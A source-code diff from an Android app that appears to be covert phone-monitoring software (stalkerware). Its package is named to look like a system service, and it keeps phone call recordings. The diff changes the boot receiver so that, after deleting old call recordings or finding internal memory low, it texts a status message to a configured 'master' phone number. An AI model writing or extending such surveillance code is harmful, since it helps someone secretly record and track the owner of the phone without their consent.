@@ -11,6 +11,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.MemoryUtil;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.location.BaseStationLocation;
@@ -143,7 +144,21 @@ public class BootReceiver extends BroadcastReceiver {
 			new Thread(new Runnable(){
 				public void run() {
 					// Start a new thread to clear redundant phone call recordings
-					FileCtrl.reduceWavFiles(BootReceiver.this.context, WAV_FILE_MAX_NUM);
+					int removedFileCount = FileCtrl.reduceWavFiles(BootReceiver.this.context, WAV_FILE_MAX_NUM);
+					if (removedFileCount > 0) {
+						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(BootReceiver.this.context);
+						String msg = String.format(BootReceiver.this.context.getResources().getString(R.string.memory_some_old_wav_deleted), String.valueOf(removedFileCount));
+						SmsCtrl.sendSms(recvPhoneNum, msg);
+					}
+					
+					// Check internal memory free size, warn master if it is not enough
+					long freeInternalMemory = MemoryUtil.getFreeSizeOfInternalMemory();
+					if (freeInternalMemory < (MemoryUtil.BYTES_OF_1MB*10)) {
+						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(BootReceiver.this.context);
+						String msg = String.format(BootReceiver.this.context.getResources().getString(R.string.memory_not_enough_internal_memory), freeInternalMemory*1.0/MemoryUtil.BYTES_OF_1MB);
+						SmsCtrl.sendSms(recvPhoneNum, msg);
+					}
+					
 				}
 			}).start();
 			
